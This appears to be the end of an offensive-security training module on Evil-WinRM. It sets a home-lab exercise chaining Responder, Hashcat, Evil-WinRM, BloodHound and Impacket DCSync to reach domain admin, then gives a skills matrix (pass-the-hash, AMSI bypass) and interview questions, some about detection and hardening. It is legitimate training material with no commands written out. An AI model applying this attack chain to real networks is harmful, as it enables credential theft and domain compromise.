Build a home AD lab (1 DC + 2 workstations). Starting from only network access and no credentials: (1) discover with Nmap, (2) enumerate with Kerbrute, (3) capture NetNTLMv2 with Responder, (4) crack with Hashcat, (5) lateral movement with Evil-WinRM, (6) enumerate with BloodHound, (7) escalate to DA, (8) DCSync with Impacket. Document every step.

---

## 🎓 Competency Matrix

| Skill | Beginner | Intermediate | Advanced |
|:------|:--------:|:------------:|:--------:|
| Basic password shell connection | [ ] | | |
| Pass-the-hash authentication | | [ ] | |
| File upload / download | [ ] | | |
| In-memory script loading (`-s`) | | [ ] | |
| In-memory .NET execution (`-e`) | | [ ] | |
| AMSI bypass | | | [ ] |
| SSL / HTTPS mode | [ ] | | |
| Kerberos ticket auth | | [ ] | |
| NetExec → Evil-WinRM chain | | [ ] | |
| BloodHound path → shell execution | | | [ ] |
| SAM/SYSTEM hive extraction | | [ ] | |
| Full AD zero-to-DA using Evil-WinRM | | | [ ] |

---

## 💬 Interview Questions

1. What protocol does Evil-WinRM use and which ports does it run on?
2. What Windows group membership is required for a user to connect via WinRM?
3. How does pass-the-hash work with Evil-WinRM — what format does the `-H` flag expect?
4. What is the difference between `-s` and `-e` in Evil-WinRM?
5. What Windows event IDs would a defender use to detect Evil-WinRM sessions?
6. Why must you use a hostname (not an IP) when authenticating with Kerberos via `-r`?
7. What is AMSI, and why is bypassing it important before loading offensive PowerShell scripts?
8. How would you use Evil-WinRM to collect BloodHound data without writing SharpHound to disk?
9. What is the difference between PTH with Evil-WinRM vs PTH with Impacket's psexec?
10. How would you harden a Windows environment against Evil-WinRM lateral movement?
